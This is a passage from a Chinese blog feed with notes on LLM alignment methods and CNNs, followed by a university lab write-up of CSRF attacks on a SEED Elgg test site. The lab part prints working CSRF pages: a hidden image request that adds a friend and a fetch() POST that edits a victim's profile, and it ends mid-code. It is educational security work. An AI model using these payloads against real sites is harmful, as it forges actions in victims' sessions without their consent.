Assignment）难题</strong>：LLM生成一个句子包含几十个Token，但奖励（Reward）通常只在句末给出一个总分。PPO很难精准判断到底是哪一个词导致了高分或低分，这种“稀疏反馈”导致梯度更新方向反复横跳。</li><li><strong>双重分布漂移</strong>：PPO涉及两个动态系统：一是<strong>策略模型</strong>在变，二是<strong>价值模型（ValueNetwork）</strong>在追。如果价值模型估算不准，提供的优势函数（Advantage）就会误导策略模型，导致训练瞬间崩盘。</li><li><strong>非平稳性与 KL 惩罚</strong>：为了防止模型跑偏，PPO 必须加入KL散度约束。但这个系数极难调——设大了模型不学（不更新），设小了模型直接输出乱码（RewardHacking）。</li></ul><h3 id="dpo-与-orpo-的核心本质">DPO 与 ORPO 的核心本质</h3><p><strong>DPO (Direct Preference Optimization)</strong></p><ul><li><strong>核心原理</strong>：利用数学技巧，将原本需要“强化学习”解决的对齐问题，转化为了一个<strong>“查表对比”</strong>问题。<strong>不需要奖励模型</strong>。它直接在偏好数据上进行最大似然估计，将强化学习目标转化为简单的二分类交叉熵损失。更简单、稳定且高效。</li><li><strong>为什么稳</strong>：它建立了一个解析解，证明了<strong>最优策略模型与其生成的Logit概率成正比</strong>。训练时，只要模型给“好答案”的概率增幅<strong>大于</strong>给“坏答案”的概率增幅，模型就在进化。它没有复杂的采样和评分环节，本质就是<strong>对比学习</strong>。</li></ul><p><strong>ORPO (Odds Ratio Preference Optimization)</strong></p><ul><li><strong>核心原理</strong>：直接修改了 SFT的损失函数。它认为模型不应该只学会“说什么对”，还得学会“什么不能说”。</li><li><strong>核心逻辑</strong>：<ol type="1"><li><strong>弱化负样本</strong>：它通过 <strong>OddsRatio（几率比）</strong>这种概率统计学指标，直接惩罚模型生成负样本（Rejected）的概率。</li><li><strong>单阶段对齐</strong>：它不需要 PPO 的四个模型，也不需要 DPO的参考模型（Reference Model），只靠一个模型在 SFT过程中同时完成“学习知识”和“偏好选择”。</li></ol></li></ul><h2id="介绍一些agent的实现框架这些框架有什么区别langgraph适用于什么场景langgraph构建agent的方式有哪几种">8，介绍一些Agent的实现框架；这些框架有什么区别；LangGraph适用于什么场景；LangGraph构建Agent的方式有哪几种</h2><ul><li><strong>框架</strong>：AutoGPT (自主寻路), CrewAI (多角色协作),LangGraph (循环流控制)。</li><li><strong>LangGraph 优势</strong>：支持 <strong>Stateful(有状态)</strong> 和 <strong>Cyclic (循环)</strong>。传统 LangChain 是DAG（有向无环图），难以处理需要反复迭代、纠错的复杂逻辑。</li><li><strong>构建方式</strong>：1. <strong>StateGraph</strong>(显性状态定义); 2. <strong>Nodes &amp; Edges</strong>(逻辑节点与边)。</li></ul><h2id="场景题客户输入一个软件或网页界面截图如何通过rag的方式帮助用户了解界面的每一个组件的作用说实话没太听懂输入输出自己定义相似的组件如图片框和视频框如何区分">9，场景题：客户输入一个软件或网页界面截图，如何通过RAG的方式帮助用户了解界面的每一个组件的作用（？？？说实话没太听懂），输入输出自己定义；相似的组件如图片框和视频框如何区分</h2><h3 id="方案定义">方案定义</h3><ul><li><strong>输入</strong>：界面截图 + 目标组件位置 (Bounding Box)或坐标。</li><li><strong>输出</strong>：该组件的功能描述、交互逻辑。</li><li><strong>实现流程</strong>：<ol type="1"><li><strong>预处理</strong>：使用多模态模型（如 GPT-4o 或专用OCR+目标检测模型）对截图进行元素提取。</li><li><strong>索引</strong>：将组件的特征（视觉特征 + 位置信息 +关联文本）存入向量库。</li><li><strong>检索</strong>：用户点击或输入位置时，计算坐标重合度或特征相似度。</li><li><strong>生成</strong>：结合该组件的文档描述（Context）生成说明。</li></ol></li></ul><h3 id="区分相似组件图片框-vs-视频框">区分相似组件（图片框 vs视频框）</h3><ol type="1"><li><strong>多模态特征</strong>：视频框通常伴随播放按钮特征（三角图标）、进度条特征。</li><li><strong>代码/元数据</strong>：如果是从代码层抽取的，查看<code>&lt;img&gt;</code> 标签与 <code>&lt;video&gt;</code> 或<code>&lt;iframe&gt;</code> 标签的区别。</li><li><strong>时域分析</strong>：如果是动态输入，视频框会有帧率变化，图片框保持静态。</li></ol><p><ahref="https://www.xiaohongshu.com/explore/69188729000000000503bb66?app_platform=ios&amp;app_version=9.12.2&amp;share_from_user_hidden=true&amp;xsec_source=app_share&amp;type=normal&amp;xsec_token=CBO_gMH8TYsZlSZ4cVu3YNidnacfVrk2ZnNVz1MuchRRk=&amp;author_share=1&amp;xhsshare=WeixinSession&amp;shareRedId=ODxFMjU-Sk42NzUyOTgwNjdHOTo2Rj1K&amp;apptime=1765672895&amp;share_id=d1250146cbed4d6287b12a57fcc72633">原文链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI Agent </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNNs - Part 2</title>
      <link href="/zh/2025/10/03/Deep-Learning/CNN_P2/"/>
      <url>/zh/2025/10/03/Deep-Learning/CNN_P2/</url>
      
        <content type="html"><![CDATA[<h1 id="卷积神经网络-cnn---第2部分">卷积神经网络 (CNN) - 第2部分</h1><h2 id="附录">附录</h2><ul><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec9.CNN1.pdf">CNN1幻灯片</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec10.CNN2.pdf">CNN2幻灯片</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec11.CNN3.pdf">CNN3幻灯片</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec12.CNN4.pdf">CNN4幻灯片</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Deep Learning </tag>
            
            <tag> CNN </tag>
            
            <tag> CMU 11-785 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNNs - Part 1</title>
      <link href="/zh/2025/10/02/Deep-Learning/CNN_P1/"/>
      <url>/zh/2025/10/02/Deep-Learning/CNN_P1/</url>
      
        <content type="html"><![CDATA[<h1 id="卷积神经网络-cnn---第1部分">卷积神经网络 (CNN) - 第1部分</h1><p>首先，我们知道一些关于MLP（多层感知器）的事实：</p><ul><li>MLP是通用的函数逼近器。（布尔函数、分类器和回归）</li><li>MLP可以通过梯度下降的变体进行训练</li></ul><p>但我们如何满足<strong>平移不变性</strong>的需求，传统的MLP对模式的位置敏感，导致需要一个非常大的网络来覆盖模式的所有可能位置。因此，引入了CNN。</p><p>本讲座有两个场景：</p><ol type="1"><li>1D输入（例如，时间序列）</li><li>2D输入（例如，图像）</li></ol><h2 id="常规网络与扫描网络">常规网络与扫描网络</h2><h3 id="常规网络">常规网络</h3><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002144814402.png"alt="常规网络" /><figcaption aria-hidden="true">常规网络</figcaption></figure><p>在常规的MLP中，同一层中的每个神经元通过唯一的权重连接到前一层的每个单元。</p><ul><li>权重矩阵中的所有条目都是<strong>唯一的</strong></li><li>权重矩阵（通常）是满的</li></ul><h3 id="扫描网络">扫描网络</h3><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/Screenshot%202025-10-02%20at%2014.50.47.png"alt="扫描网络" /><figcaption aria-hidden="true">扫描网络</figcaption></figure><p>在扫描MLP中，每个神经元连接到前一层的一部分神经元。</p><ul><li>权重矩阵是稀疏的</li><li>权重矩阵是具有<strong>相同块</strong>的块结构</li><li>网络是一个<strong>共享参数模型</strong></li></ul><div class="note info flat"><p>扫描网络是我们在本讲座中的重点。</p></div><h2 id="共享参数模型中的学习">共享参数模型中的学习</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002150101208.png" alt="共享参数模型" width="30%"/></p><h3 id="共享参数">1) 共享参数</h3><p>多个连接被限制为具有相同的参数： <span class="math display">\[w_{ij}^k = w_{mn}^l = w^s\]</span></p><p>对于任何训练实例<span class="math inline">\(X\)</span>，<spanclass="math inline">\(w^s\)</span>的微小扰动将同时扰动<spanclass="math inline">\(w_{ij}^k\)</span>和<spanclass="math inline">\(w_{mn}^l\)</span>。这些扰动将分别影响最终的散度（损失）：<span class="math display">\[Div(d, y)\]</span></p><p>关于共享参数<spanclass="math inline">\(w^s\)</span>的梯度等于关于每个共享权重的梯度之和：<span class="math display">\[\frac{\partial Div}{\partial w^s}= \frac{\partial Div}{\partial w_{ij}^k} \cdot \frac{\partialw_{ij}^k}{\partial w^s}+ \frac{\partial Div}{\partial w_{mn}^l} \cdot \frac{\partialw_{mn}^l}{\partial w^s}\]</span> 由于<span class="math inline">\(w_{ij}^k = w_{mn}^l =w^s\)</span>，这简化为： <span class="math display">\[\frac{\partial Div}{\partial w^s}= \frac{\partial Div}{\partial w_{ij}^k}+ \frac{\partial Div}{\partial w_{mn}^l}\]</span></p><p>总之，关于共享参数的梯度<strong>是其每个实例的梯度之和</strong>。</p><h3 id="共享参数的梯度">2) 共享参数的梯度</h3><p><span class="math inline">\(S = \{e_1, e_2, ...,e_N\}\)</span>是共享边的集合。因此，总梯度是集合中所有边的和： <spanclass="math display">\[\frac{\partial Div}{\partial w^s}= \sum_{e \in S} \frac{\partial Div}{\partial w^e}\]</span></p><p>然后关于<span class="math inline">\(w^s\)</span>的损失梯度为 <spanclass="math display">\[\nabla_S \mathrm{Loss}= \frac{\partial \mathrm{Loss}}{\partial w^s}= \sum_{e \in S} \frac{\partial \mathrm{Loss}}{\partial w^{e}}.\]</span></p><h3 id="梯度下降更新">3) 梯度下降更新</h3><p>使用学习率<span class="math inline">\(\eta\)</span>，更新共享参数：<span class="math display">\[w^s \leftarrow w^s - \eta \ \nabla_S \mathrm{Loss}.\]</span></p><p>更新后，将新的共享值写回每个绑定的权重： <spanclass="math display">\[\forall (k,i,j)\in S:\quad w^{(k)}_{i,j} \leftarrow w^s.\]</span></p><h3 id="训练循环">4) 训练循环</h3><ol type="1"><li>初始化所有权重$ _1, _2, , _K $。</li><li>对于每个绑定集<span class="math inline">\(S\)</span>：<ul><li>反向传播以获取每个边<span class="math inline">\(e\in S\)</span>的$$。</li><li>求和以获得$ _S $。</li><li>更新$ w^s w^s - , _S $。</li><li>将更新后的$ w^s <span class="math inline">\(同步回所有\)</span>w^{(k)}_{i,j} S $。</li></ul></li><li>重复直到损失收敛。</li></ol><h2 id="分布式与非分布式扫描">分布式与非分布式扫描</h2><h3 id="定义">定义</h3><ul><li><strong>分布式扫描</strong>：参数（权重）在<strong>空间位置之间共享</strong>。<br />→ 示例：在每个位置重用卷积核。</li><li><strong>非分布式扫描</strong>：参数<strong>不共享</strong>；每个位置/块都有自己的一组权重。</li></ul><h3 id="关键区别">关键区别</h3><ul><li><strong>参数共享</strong>：分布式 ✅ | 非分布式 ❌</li><li><strong>参数数量</strong>：<ul><li>分布式：与位置数量无关；参数更少。<ul><li>公式：<span class="math inline">\(K_0 D N_1 + K_1 N_1 N_2 + N_2N_3\)</span></li></ul></li><li>非分布式：随着位置数量线性增长（每个位置复制）。</li></ul></li><li><strong>归纳偏置</strong>：<ul><li>分布式：强制<strong>平移等变性/不变性</strong>。<br /></li><li>非分布式：没有这种偏置；更灵活但容易过拟合。</li></ul></li><li><strong>输出排列</strong>：<ul><li>分布式：自然生成与输入网格对齐的特征图。<br /></li><li>非分布式：不需要遵循相同的形状（可以只收集输出）。</li></ul></li><li><strong>效率</strong>：<ul><li>分布式：参数更少，更好的泛化，内存/计算更便宜。<br /></li><li>非分布式：参数更多，成本高，扩展性差。</li></ul></li><li><strong>实现类比</strong>：<ul><li>分布式 ≈ 卷积（共享核）。<br /></li><li>非分布式 ≈ 在每个位置应用独立的MLP。</li></ul></li></ul><h3 id="一句话总结">一句话总结</h3><p><strong>本质</strong>：分布式与非分布式扫描的区别在于权重是否在<strong>位置之间共享</strong>——这直接影响参数数量、泛化能力和效率。</p><h2 id="cnn中的术语">CNN中的术语</h2><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002164429959.png"alt="卷积神经网络" /><figcaption aria-hidden="true">卷积神经网络</figcaption></figure><p><strong>滤波器（核）</strong>：一个学习的权重张量<spanclass="math inline">\(W_c \in \mathbb{R}^{K_h \times K_w \timesC_{\text{in}}}\)</span>在每个位置重用；在<spanclass="math inline">\((u,v,c)\)</span>处的输出：<spanclass="math inline">\(y(u,v,c)=\sigma(\langle \text{patch}(u,v),W_c\rangle + b_c)\)</span>。</p><p><strong>感受野</strong>：影响神经元输出的输入区域；每层（1D）<spanclass="math inline">\(r_l=r_{l-1}+(k_l-1)\,d_l\,j_{l-1}\)</span>，<spanclass="math inline">\(j_l=j_{l-1}s_l\)</span>，其中<spanclass="math inline">\(r_0=1, j_0=1\)</span>。</p><p><strong>步幅</strong>：在输入上滑动滤波器时的步长；较大的步幅会减少输出大小。</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002165111427.png"alt="展平" /><figcaption aria-hidden="true">展平</figcaption></figure><p><strong>展平</strong>：将最终特征图从形状<spanclass="math inline">\(H \times W \times C\)</span>重塑为长度为<spanclass="math inline">\(HWC\)</span>的1-D向量（每个样本），然后输入全连接/softmax层。</p><div class="note info flat"><p><strong>带分类头</strong>：通过将嵌入<spanclass="math inline">\(z\)</span>输入线性层+softmax（交叉熵）进行<strong>分类</strong>训练，在<spanclass="math inline">\(C\)</span>个类别中预测一个ID。<strong>不带分类头</strong>：用于<strong>验证</strong>，去掉线性/softmax，并用相似度（例如，余弦）比较两个嵌入<spanclass="math inline">\(z_1,z_2\)</span>以决定<strong>匹配与不匹配</strong>（阈值/EER）。</p></div><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002170855251.png"alt="池化" /><figcaption aria-hidden="true">池化</figcaption></figure><p><strong>池化</strong>：在卷积后对局部邻域进行下采样；</p><ul><li><strong>最大池化</strong>：<spanclass="math inline">\(y=\max(x_1,\dots,x_K)\)</span>保留最强响应；</li><li><strong>平均池化</strong>：<spanclass="math inline">\(y=\tfrac{1}{K}\sum_{i=1}^K x_i\)</span>平滑；</li></ul><p>两者都减少空间大小（步幅<spanclass="math inline">\(&gt;1\)</span>）并增加小的平移/抖动不变性。</p><h2 id="总结">总结</h2><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002171028845.png"alt="整体CNN架构" /><figcaption aria-hidden="true">整体CNN架构</figcaption></figure><ul><li>神经网络以层次方式学习模式（简单→复杂）。<br /></li><li>模式任务 =使用<strong>共享参数</strong>网络（如CNN）扫描目标。<br /></li><li>第一层扫描输入；更高层扫描之前的<strong>特征图</strong>；最后一层做出决策。<br /></li><li>扫描可以分布在各层之间；可选的<strong>池化</strong>增加小的平移不变性。<br /></li><li>2D扫描→<strong>卷积网络</strong>；沿时间的1D扫描→<strong>时间延迟神经网络</strong>（TDNN）。</li></ul><h2 id="附录">附录</h2><ul><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec9.CNN1.pdf">CNN1幻灯片</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec10.CNN2.pdf">CNN2幻灯片</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec11.CNN3.pdf">CNN3幻灯片</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec12.CNN4.pdf">CNN4幻灯片</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Deep Learning </tag>
            
            <tag> CNN </tag>
            
            <tag> CMU 11-785 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab3-Web Security</title>
      <link href="/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/"/>
      <url>/zh/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="信息系统安全实验3记录">信息系统安全实验3记录</h1><h2id="跨站请求伪造csrf攻击实验"><strong>跨站请求伪造（CSRF）攻击实验</strong></h2><h3 id="任务-1基于-get-请求的-csrf-攻击"><strong>任务 1：基于 GET 请求的CSRF 攻击</strong></h3><p>使用 samy 登录，发送添加好友命令，获取 URL。HTTP Header Live插件窗口捕获的数据包如图所示：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619220223319.png"alt="image-20240619220223319" /><figcaption aria-hidden="true">image-20240619220223319</figcaption></figure><p>由此我们可以知道 GET 请求的结构是http://www.csrflabelgg.com/action/friends/add?friend=id，所以现在我们需要获取Samy 的 ID 号码。通过尝试为 Samy创建一个新界面，我们可以看到红色高亮部分 45 是 Samy 的 ID。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619221713999.png"alt="image-20240619221713999" /><figcaption aria-hidden="true">image-20240619221713999</figcaption></figure><p>在攻击者网站下创建 get_csrf.html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/get_csrf.html</span><br></pre></td></tr></table></figure><p>写入以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Alice, you&#x27;re my friend now!</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=45&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Samy 向 Alice 发送了一封邮件，诱使 Alice 点击恶意链接http://www.csrflabattacker.com/get_csrf.html</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224208937.png"alt="image-20240619224208937" /><figcaption aria-hidden="true">image-20240619224208937</figcaption></figure><p>登录 Alice 的账户查看邮件并访问恶意网页，捕获到的 GET请求数据包添加了用户 ID 45，即 Samy，然后检查活动界面发现 Alice 添加了Samy 为好友。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224651139.png"alt="image-20240619224651139" /><figcaption aria-hidden="true">image-20240619224651139</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224818367.png"alt="image-20240619224818367" /><figcaption aria-hidden="true">image-20240619224818367</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224859567.png"alt="image-20240619224859567" /><figcaption aria-hidden="true">image-20240619224859567</figcaption></figure><h3 id="任务-2使用-post-请求的-csrf-攻击"><strong>任务 2：使用 POST请求的 CSRF 攻击</strong></h3><p>仍然先登录 Samy 的账户，然后修改个人主页，进行 POST请求数据包捕获，得到以下结果。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619230611400.png"alt="image-20240619230611400" /><figcaption aria-hidden="true">image-20240619230611400</figcaption></figure><p>POST 请求发送到http://www.csrflabelgg.com/action/profile/edit，提交的表单内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=2G9AraT4cb7pPqONMfz3sQ</span><br><span class="line">&amp;__elgg_ts=<span class="number">1718837884</span></span><br><span class="line">&amp;name=Samy</span><br><span class="line">&amp;description=&lt;p&gt;A Hacker&lt;/p&gt;</span><br><span class="line">&amp;accesslevel[description]=<span class="number">2</span></span><br><span class="line">&amp;briefdescription=Student</span><br><span class="line">&amp;accesslevel[briefdescription]=<span class="number">2</span></span><br><span class="line">&amp;location=Wuhan</span><br><span class="line">&amp;accesslevel[location]=<span class="number">2</span></span><br><span class="line">&amp;interests=Football</span><br><span class="line">&amp;accesslevel[interests]=<span class="number">2</span></span><br><span class="line">&amp;skills=python</span><br><span class="line">&amp;accesslevel[skills]=<span class="number">2</span></span><br><span class="line">&amp;contactemail=U202112149@hust.edu.cn</span><br><span class="line">&amp;accesslevel[contactemail]=<span class="number">2</span></span><br><span class="line">&amp;phone=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[phone]=<span class="number">2</span></span><br><span class="line">&amp;mobile=<span class="number">19907121291</span></span><br><span class="line">&amp;accesslevel[mobile]=<span class="number">2</span></span><br><span class="line">&amp;website=https://strivelee.top</span><br><span class="line">&amp;accesslevel[website]=<span class="number">2</span></span><br><span class="line">&amp;twitter=lixiang21</span><br><span class="line">&amp;accesslevel[twitter]=<span class="number">2</span></span><br><span class="line">&amp;guid=<span class="number">45</span></span><br></pre></td></tr></table></figure><p>根据这个请求格式，Alice 的 guid 知道是 43，尝试使用 POST 请求进行CSRF 攻击。</p><p>首先在攻击者网站下创建 get_csrf.html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure><p>写入以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">Alice, your profile has changed!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.csrflabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">        &#125;,  </span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">guid</span>:<span class="number">42</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">description</span>:<span class="string">&quot;&lt;p&gt;Samy is my hero&lt;/p&gt;&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">briefdescription</span>:<span class="string">&quot;I&#x27;m Samy&quot;</span>,   </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;)  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>Samy 向 Alice 发送了一封邮件，诱使 Alice 点击恶意链接http://www.csrflabattacker.com/post_csrf.html</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232506107.png"alt="image-20240619232506107" /><figcaption aria-hidden="true">image-20240619232506107</figcaption></figure><p>登录 Alice 的账户，然后查看并点击邮件中的链接。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232629475.png"alt="image-20240619232629475" /><figcaption aria-hidden="true">image-20240619232629475</figcaption></figure><p>我们可以看到“关于我”部分已成功修改，POST请求数据包被捕获，与现象一致。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619232821090.png"alt="image-20240619232821090" /><figcaption aria-hidden="true">image-20240619232821090</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620230509435.png"alt="image-20240620230509435" /><figcaption aria-hidden="true">image-20240620230509435</figcaption></figure><h3 id="任务-3实现登录-csrf-攻击"><strong>任务 3：实现登录 CSRF攻击</strong></h3><p>首先捕获登录请求数据包，相应的请求方法为 POST，URL 为http://www.csrflabelgg.com/action/login，请求表单包含用户名和密码，均为明文。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620164209052.png"alt="image-20240620164209052" /><figcaption aria-hidden="true">image-20240620164209052</figcaption></figure><p>表单数据内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__elgg_token=5ovl8du9mM-5V1rwIDhJsg</span><br><span class="line">__elgg_ts=<span class="number">1718872774</span></span><br><span class="line">username=Samy</span><br><span class="line">password=seedsamy</span><br></pre></td></tr></table></figure><p>首先在攻击者网站下创建 get_csrf.html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/post_csrf.html</span><br></pre></td></tr></table></figure><p>写入以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 